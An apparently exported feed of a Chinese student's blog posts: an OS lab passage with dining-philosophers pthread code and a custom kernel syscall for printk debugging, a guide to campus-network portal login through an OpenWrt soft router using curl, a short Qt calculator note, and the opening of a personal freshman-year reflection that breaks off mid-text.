PHILOSOPHER_COUNT]); <span class="comment">// 放下右边的筷子</span></span><br><span class="line">        pthread_mutex_unlock(&amp;chopsticks[id]);                           <span class="comment">// 放下左边的筷子</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> philosophers[PHILOSOPHER_COUNT];</span><br><span class="line">    <span class="type">int</span> philosopher_numbers[PHILOSOPHER_COUNT];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_mutex_init(&amp;chopsticks[i], <span class="literal">NULL</span>);</span><br><span class="line">        philosopher_numbers[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(&amp;philosophers[i], <span class="literal">NULL</span>, philosopher, &amp;philosopher_numbers[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(philosophers[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>死锁状态：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/6-program1-result.png"alt="死锁状态" /><figcaption aria-hidden="true">死锁状态</figcaption></figure><p>可以观察到，他们都同时拿起左边的筷子，造成死锁现象。</p><h3 id="非死锁解决方案">非死锁解决方案</h3><p>我对死锁的解决方案是哲学家先尝试拿起左边的筷子，然后再拿起右边的筷子。与上述不同的是，如果哲学家无法拿到右边的筷子吃饭，他们会放下当前拿着的左边的筷子，从而避免死锁问题。</p><p>在具体函数上：pthread_mutex_trylock函数替代pthread_mutex_lock以避免阻塞。如果无法立即获取锁，则不会进入等待状态，从而避免死锁情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PHILOSOPHER_COUNT 5</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> chopsticks[PHILOSOPHER_COUNT];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_random_sleep_time</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> rand() % <span class="number">400000</span> + <span class="number">100000</span>; <span class="comment">// 100ms到500ms的随机时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">philosopher</span><span class="params">(<span class="type">void</span> *num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span> *)num;</span><br><span class="line">    <span class="type">int</span> left = id;</span><br><span class="line">    <span class="type">int</span> right = (id + <span class="number">1</span>) % PHILOSOPHER_COUNT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;哲学家 %d 在思考\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// 随机思考时间</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;哲学家 %d 在休息\n&quot;</span>, id);</span><br><span class="line">        usleep(get_random_sleep_time()); <span class="comment">// 随机思考时间</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 每个哲学家尝试先拿起左边的筷子，然后再拿起右边的筷子。如果两根筷子都成功获取，哲学家开始吃饭</span></span><br><span class="line">        <span class="comment">// pthread_mutex_trylock函数替代pthread_mutex_lock以避免阻塞。如果无法立即获取锁，则不会进入等待状态，从而避免死锁情况</span></span><br><span class="line">        <span class="keyword">if</span> (pthread_mutex_trylock(&amp;chopsticks[id]) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;哲学家 %d 拿起左边的筷子\n&quot;</span>, id);</span><br><span class="line">            sleep(<span class="number">1</span>); <span class="comment">// 这里增加1秒的延迟，使哲学家更容易同时拿起左边的筷子</span></span><br><span class="line">            <span class="keyword">if</span> (pthread_mutex_trylock(&amp;chopsticks[(id + <span class="number">1</span>) % PHILOSOPHER_COUNT]) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;哲学家 %d 拿起右边的筷子\n&quot;</span>, id);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;哲学家 %d 在吃饭\n&quot;</span>, id);</span><br><span class="line">                usleep(get_random_sleep_time()); <span class="comment">// 随机吃饭时间</span></span><br><span class="line"></span><br><span class="line">                pthread_mutex_unlock(&amp;chopsticks[(id + <span class="number">1</span>) % PHILOSOPHER_COUNT]);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;哲学家 %d 放下右边的筷子\n&quot;</span>, id);</span><br><span class="line">            &#125;</span><br><span class="line">            pthread_mutex_unlock(&amp;chopsticks[id]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;哲学家 %d 放下左边的筷子\n&quot;</span>, id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> philosophers[PHILOSOPHER_COUNT];</span><br><span class="line">    <span class="type">int</span> philosopher_numbers[PHILOSOPHER_COUNT];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_mutex_init(&amp;chopsticks[i], <span class="literal">NULL</span>);</span><br><span class="line">        philosopher_numbers[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(&amp;philosophers[i], <span class="literal">NULL</span>, philosopher, &amp;philosopher_numbers[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PHILOSOPHER_COUNT; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(philosophers[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非死锁程序执行结果：</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/6-program2-result.png"alt="非死锁程序执行结果" /><figcaption aria-hidden="true">非死锁程序执行结果</figcaption></figure><p>这里我故意让哲学家在拿起左边的筷子后睡得更久，造成他们都同时拿起左边的筷子冲突。从图中可以看到，所有5个哲学家确实同时拿起了左边的筷子。与死锁方法不同，哲学家4主动放下了左边的筷子，重新进入思考状态，避免了死锁情况。</p><p>参考资料：</p><p><ahref="https://blog.csdn.net/monologuezjp/article/details/85449544">哲学家就餐问题</a></p><p><ahref="https://blog.csdn.net/low5252/article/details/104800671">五个哲学家就餐问题</a></p><h2id="任务7学习linux内核并使用printk调试进程创建和调度策略相关信息">任务7：学习Linux内核并使用printk调试进程创建和调度策略相关信息</h2><p>要求：编写应用程序Hello.c，调用fork创建进程，跟踪新创建的子进程在内核中的fork过程，并显示与调度策略相关的PCB成员变量。</p><ol type="1"><li>编写应用程序Hello.c，调用fork创建子进程（功能无限），打印父子进程的ID号。</li><li>在内核中适当位置使用printk（如do_fork函数中的某个地方）输出调试信息，如“当前创建进程对应cmd、进程ID和父进程ID”。</li><li>为避免do_fork函数频繁输出上述调试信息，必须限制仅在Hello程序中调用fork时输出上述调试信息。请思考如何实现。</li></ol><blockquote><p>参考方法：内核设计全局变量boolflag和系统调用SetDebug(bool)，SetDebug可以修改flag值为true或false。在Hello程序中，在调用fork函数前调用SetDebug(true)，在调用fork函数后调用SetDebug(false)以修改flag。当printk调试信息时，检查flag以确定是否使用printk输出调试信息。</p></blockquote><p>友情提醒：do_fork函数在新版本的Linux内核源代码中已被kernel_clone函数替代。</p><h3 id="修改.kernelfork.c文件">修改./kernel/fork.c文件</h3><p>在kernel_clone中使用printk打印相关信息。p是指向task_struct结构的指针，comm是当前执行的命令，pid是子进程ID，current-&gt;pid是父进程ID，current是指向父进程的宏。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/7-add_code.png"alt="在kernel_clone中添加printk代码" /><figcaptionaria-hidden="true">在kernel_clone中添加printk代码</figcaption></figure><p>添加新的系统调用setdebug用于设置debug_fork_flag。bool值debug_fork_flag是一个全局变量，用于控制是否输出。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/7-setdebug.png"alt="setdebug系统调用" /><figcaption aria-hidden="true">setdebug系统调用</figcaption></figure><h3 id="添加声明">添加声明</h3><ol type="1"><li>系统调用：./kernel/fork.c（已修改）</li><li>系统调用函数声明：./include/linux/syscalls.h</li><li>ID：./arch/x86/entry/syscalls/syscall_64.tbl</li><li>ID声明：./include/uapi/asm-generic/unistd.h</li></ol><p>其余3个文件的修改操作已在实验1的添加系统调用任务中实践过，因此在此不再重复。</p><h3 id="编译内核">编译内核</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 已在实验1内核编译中实践过</span></span><br><span class="line">make mrproper</span><br><span class="line">make clean</span><br><span class="line">make -j6</span><br><span class="line">make modules_install</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="编写测试代码">编写测试代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义SetDebug系统调用号（需要在内核中注册）</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_SETDEBUG 447</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SetDebug</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">    syscall(SYS_SETDEBUG, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    SetDebug(<span class="number">1</span>); <span class="comment">// 启用调试信息</span></span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 子进程</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;子进程ID：%d\n&quot;</span>, getpid());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 父进程</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;父进程ID：%d\n&quot;</span>, getpid());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// fork失败</span></span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SetDebug(<span class="number">0</span>); <span class="comment">// 禁用调试信息</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了测试功能，我在另一个测试代码中注释掉SetDebug函数，并同时执行两个程序。预期效果是，只有调用SetDebug函数的程序在fork期间会输出调试信息。</p><p>test1未启用打印信息，test2启用打印信息。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/7-result1.png"alt="运行test1和test2" /><figcaption aria-hidden="true">运行test1和test2</figcaption></figure><p>使用dmesg查看信息。在下图中，我们可以看到背景信息中有一行关于创建进程的信息，cmd=test2，并且与上图中的子进程和父进程PID进行比较，它们也是一致的。</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/7-result2.png"alt="dmesg打印背景信息" /><figcaption aria-hidden="true">dmesg打印背景信息</figcaption></figure><p>参考资料：</p><p><a href="https://zhuanlan.zhihu.com/p/617398860">Linux内核进程 -do_fork()函数实现原理</a></p><p><ahref="https://blog.csdn.net/liushengxi_root/article/details/81332740">Linux内核源代码fork解释</a></p>]]></content>
      
      
      <categories>
          
          <category> HUST 实验报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Campus Network Router Connection with Web Authentication</title>
      <link href="/zh/2023/02/17/Tools/Campus%20Network%20Router%20Connection%20with%20Web%20Authentication/"/>
      <url>/zh/2023/02/17/Tools/Campus%20Network%20Router%20Connection%20with%20Web%20Authentication/</url>
      
        <content type="html"><![CDATA[<h1 id="需求">需求</h1><p>由于校园网络的设备数量限制，我想使用校园有线网络连接自己的路由器，以解除设备数量限制，并实现所谓的硬件VPN，通过路由器将流量转发到代理服务器，这样在这个路由器形成的网络中的设备就不需要启动VPN软件，从而省去一些麻烦。</p><h1 id="难点与解决方案">难点与解决方案</h1><p>校园网络与家庭网络不同，需要进行网页认证才能连接。起初，我以为可以直接购买一台现成的路由器（ASUSTUFAX3000）进行认证，但结果发现认证界面不会弹出。于是我购买了一台软路由R2S（本质上是微型计算机），并安装了<ahref="https://zh.wikipedia.org/zh-hans/OpenWrt">OpenWrt</a>系统作为上级路由器，因为它本质上是一个嵌入式Linux系统，带有命令行工具，我可以使用<code>curl</code>命令向校园网络认证界面（华中科技大学使用192.168.50.3）发送HTTP请求以实现登录。至于VPN，我只需在软路由软件中配置订阅的代理服务器地址。是的，本质上它仍然是软件VPN，但由网关处理。</p><h1 id="过程演示">过程演示</h1><h2 id="设备准备">设备准备</h2><p>一台路由器，一台软路由，两根网线，一台计算机。</p><h2id="使用网络数据包捕获获取校园网络认证的http请求内容值">使用网络数据包捕获获取校园网络认证的HTTP请求内容值</h2><p>首先，将一根网线的一端连接到校园有线网络端口，另一端连接到你的计算机。通过浏览器访问校园网络认证界面，最好禁用WiFi。提前输入你的账号和密码，<strong>但不要点击登录</strong>。<imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2020.01.16.png" /></p><h3 id="进入开发者模式">进入开发者模式</h3><p>按F12进入浏览器的开发者模式，简单浏览一下，了解网页的逻辑，特别是登录功能。<imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2020.05.27.png" /></p><h3 id="在post位置设置断点">在POST位置设置断点</h3><p>就像正常调试代码一样。 <imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2020.06.24.png" /></p><h3 id="点击登录以获取内容值">点击登录以获取内容值</h3><p><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2020.27.04.png" /></p><h3 id="使用curl命令发送请求">使用curl命令发送请求</h3><p>编写一个shell脚本，或者根本不写。 <imgsrc="https://picx.zhimg.com/80/v2-285e2cea8e82f818410f32dd796559b3_1440w.png" />在使用chmod命令赋予其执行权限后，执行脚本。如果返回值为“success”，则表示命令执行成功并完成校园网络认证；如果不成功，请重复内容获取操作，因为我第一次也失败了。</p><h2 id="配置软路由">配置软路由</h2><h3 id="安装openwrt系统">安装OpenWrt系统</h3><p>由于GitHub上有许多开源选项，效果应该相似，所以可以选择任何一个。大多数在淘宝上购买的软路由都是预装的。如果你有一台全新的机器，可以参考下面的视频安装OpenWrt系统。<div class="video-container"><iframe src="https://www.youtube.com/embed/gsrAj1vySaE" frameborder="0" loading="lazy" allowfullscreen></iframe></div></p><h3 id="访问软路由后台">访问软路由后台</h3><p>将TF卡正确插入软路由，并确保软路由上的sys指示灯正常。<img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E6%88%AA%E5%B1%8F2023-02-16%2019.46.52.png"/></p><p>将一根网线的一端连接到校园有线网络端口，另一端连接到软路由的WAN端口。将另一根网线的一端连接到软路由的LAN端口，另一端连接到你的计算机。此时，计算机和软路由处于同一局域网。通过浏览器访问软路由的IP地址（通常由卖家提供；如果没有，可以检查网关的IP地址或禁用DHCP进行手动分配）并使用用户名和密码登录。<imgsrc="https://picx.zhimg.com/80/v2-7d989b04c23b0a4f5f0bef25068a117a_1440w.png" /></p><h3 id="在命令行中使用curl命令">在命令行中使用curl命令</h3><p>访问软路由的命令行工具，并使用上面编写的curl命令进行校园网络认证。最好尝试ping一下百度，看看是否有效。<imgsrc="https://pica.zhimg.com/80/v2-1b493abb1ef9054903270b5bdffeabb5_1440w.png" /></p><h3 id="配置互联网访问">配置互联网访问</h3><p>我使用的是内置软件OpenClash。你可以使用任何代理软件，然后像在其他设备上一样通过输入订阅URL进行配置。<imgsrc="https://pic1.zhimg.com/80/v2-d9aab76bd341cae45b8c5524653098e7_1440w.png" /></p><h2 id="配置硬路由">配置硬路由</h2><p>由于软路由无法像普通路由器一样发送无线网络信号（至少我的入门级机器无法），你需要使用真正的路由器发送WiFi信号或提供更多的有线网络连接端口。我的ASUS路由器就是为了这个目的。重点是连接到软路由LAN端口的电缆，将原本连接到计算机的端连接到路由器的WAN端口。当然，你也可以将其连接到LAN端口，但需要使用路由器的AP模式。不同之处在于，当连接到WAN端口时，软路由成为上游路由器，无法通过输入其IP地址访问软路由的后台（至少以我目前的技术水平）；而连接到LAN端口时，软路由与我们的设备处于同一局域网（此时，路由器就像一个具有无线功能的交换机）。</p><p>我将其连接到WAN端口，然后使用任何可以访问互联网的设备连接到WiFi信号，并根据路由器背面的信息（如名称和密码）完成初始路由器设置。这个过程相对简单，不再详细说明。</p><h1 id="最后说明">最后说明</h1><p>由于学校电力和网络中断的限制，导致设备在夜间断开连接，我们不能每次都重复登录软路由后台以连接校园网络。然而，似乎在启用无缝认证后，即使在断开一段时间后也能自动重新连接。我仍然计划在有时间时编写一个自动登录和登出脚本，以遵守学校规定。</p><p>上述方法确实适用于我的情况，而我购买的路由器本身支持刷机。实际上，对于不需要认证的一般家庭网络，你不需要软路由。一些ASUS路由器系列支持刷Merlin固件，本质上是为ASUS路由器适配的OpenWrt系统。由于我还没有找到更好的解决方案，只能维持现状。软路由更多地作为一个辅助路由器，专门为家中的电视盒子提供广告拦截服务，或进行流媒体加速，最重要的是，能够访问互联网观看外国流媒体软件。</p><p>参考文章 <ahref="https://blog.csdn.net/qq_30763587/article/details/119523231">在OpenWrt下实现校园网络网页认证</a><ahref="https://zhuanlan.zhihu.com/p/443145372?utm_campaign=shareopn&amp;utm_medium=social&amp;utm_oi=1137483569697013760&amp;utm_psn=1609660582969470976&amp;utm_source=wechat_session">华中科技大学校园网络自动重连</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具与工作流 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Computer Networks - Campus Network - Routing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qt</title>
      <link href="/zh/2022/09/03/CPP/Qt/"/>
      <url>/zh/2022/09/03/CPP/Qt/</url>
      
        <content type="html"><![CDATA[<p><ahref="https://github.com/liubf21/Qt-Practical-Training-For-Programming">Feiye的Qt仓库</a></p><h1 id="简单计算器的实现">简单计算器的实现</h1><p>按照下面的视频逐步操作，您可以对Qt有一个大致的了解，我个人为几个按键编写了功能，这可以算是我第一个带有UI界面的简单程序。</p><div class="video-container"><iframe src="https://www.youtube.com/embed/txGRU7OrTZo" frameborder="0" loading="lazy" allowfullscreen></iframe></div><p><ahref="https://github.com/hustlixiang21/Qt_Practice/tree/main/Calculator">点击查看源代码</a></p><p>效果图： <imgsrc="https://picx.zhimg.com/80/v2-9e256ce589cf3dff00310312c0ad7f46_1440w.png"alt="效果图" /> # 添加程序图标 参考博客：<ahref="https://blog.csdn.net/yc__coder/article/details/107425940?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-107425940-blog-79359228.pc_relevant_multi_platform_featuressortv2dupreplace&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-107425940-blog-79359228.pc_relevant_multi_platform_featuressortv2dupreplace&amp;utm_relevant_index=3">在Mac上设置Qt应用程序图标</a></p><p>当然，最好的方法是查看<ahref="https://resources.qt.io/learning-hub">官方文档</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 工具与工作流 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Language </tag>
            
            <tag> UI Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大一学年总结</title>
      <link href="/zh/2022/08/04/Personal/%E5%A4%A7%E4%B8%80%E5%AD%A6%E5%B9%B4%E6%80%BB%E7%BB%93/"/>
      <url>/zh/2022/08/04/Personal/%E5%A4%A7%E4%B8%80%E5%AD%A6%E5%B9%B4%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p><font size=5px>忙于生活，或忙于死亡。</font></p></blockquote><iframe src="//player.bilibili.com/player.html?aid=505421421&amp;bvid=BV1Sg411F7cb&amp;cid=405595939&amp;page=1" width="100%" height="540" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe><h1 id="一个阶段的结束">一个阶段的结束</h1><p>滴滴滴…</p><p>高考结束的铃声响起，身上的重担全部消失了，高中三年第一次全身心放松的离开我的母校，也是最后一次。</p><p><imgsrc="https://pic4.zhimg.com/80/v2-f087e91d7da10e616c5abb9effd0833c_1440w.jpeg" /></p><p>在洪高旁边拍摄的最后一张照片，标志高中的结束，我也搬离了那里。这条路，我走过很多很多次，这个湖，我也曾远眺过很多很多次。那时的我喜欢望着远方憧憬着大学的一切，充满梦想与激情。我就是那么一个感性，拥有着一个丰富内心世界的人。</p><blockquote><p>离开了，就永远回不去了。另一个残酷的事实就是，我即将脱离父母的羽翼，独立追求着自己梦想…</p></blockquote><hr /><h1 id="开端">开端</h1><p>带着高考的些许不甘心和迈入新阶段的激动与憧憬。我来到了这里。1037号森林——华中科技大学。</p><p><imgsrc="https://pic2.zhimg.com/80/v2-35ae425967378f31ee31cbfc10d0178d_1440w.jpeg" /></p><hr /><p>站在校门前，身旁是大包小包的物件，看着这个陌生的地方，看着这些陌生的人，憧憬着未来几年大学的生活，探索属于我自己的一条路…</p><p><img src="https://pic1.zhimg.com/80/v2-57a85bdc69159d055a04b90d4570d075_1440w.jpeg" alt="Pulpit rock" width="500" height="650"></p><hr /><p>一段新的、未知的甚至可能是艰难的旅程就此开始…</p><h1 id="适应">适应</h1><p>初入大学的我，第一次的挑战，是为期19天的军训，唯一的收获是认识了许多不同的人，听到了许多不同的事儿，最开心的时候莫过于大家坐在一起开心的聊着聊那。累但没有什么压力。</p><p>大学的第一堂课没记错的话应该是微积分，进入一个只在视频上见到过的大教室，坐满了人。和那很窄的桌子，时不时吱吱作响的椅子。四块可以挪动的黑板，上课铃声响起，总之，第一堂课就那么开始了，学习生活就那么开始了。</p><p>刚开始，课不是很多，难度也不是很大。令我感到最不同的是，那种自由的感觉，没有人催促你的感觉，甚至是没有管你的感觉。有大把的时间可以自我支配，打游戏，看手机，刷视频都行。</p><p>我当时就不停的问自己，你想要的生活是什么？我的决定就是，誓死不做摆烂人，我要成为一个能够控制自己身体和意志的人，我需要提高自己各方面的能力！</p><p>我迈开的第一步就是加入学院的学生组织，媒体宣传部，因为我想提升自己社交，工作能力和学习一些实用技术，例如摄影，p图、推文排版。我也认识了很多很多的人，他们对我的帮助也很大。</p><p>第一个学期，学习方面我好像陷入了另一个误区，所有的课程我都不听，自己去学，有的课甚至不去，去图书馆自习，我觉得自己能够搞得好，但是现实似乎略显骨感，分数并不高。好在通过期末痛苦的复习，取得了不错的成绩，没记错的话加权的排名在整个学院应该是第九，分流到信安应该是第三。其实并没有什么出众的地方，无非就是认真复习而已。</p><p>这可能是属于我的一个特质吧，初入一个新的阶段，我适应得会比较快，我也能保持一种谦卑的心态，能够沉得下心来去专注自己的事情。同时也不得不坦白我的一个缺点，浮躁，通常是一切顺利的时候，会把自己的姿态放高，自我感觉良好，然后一个打击之后气焰全无。这一点在第二个学期得到了印证。</p><h1 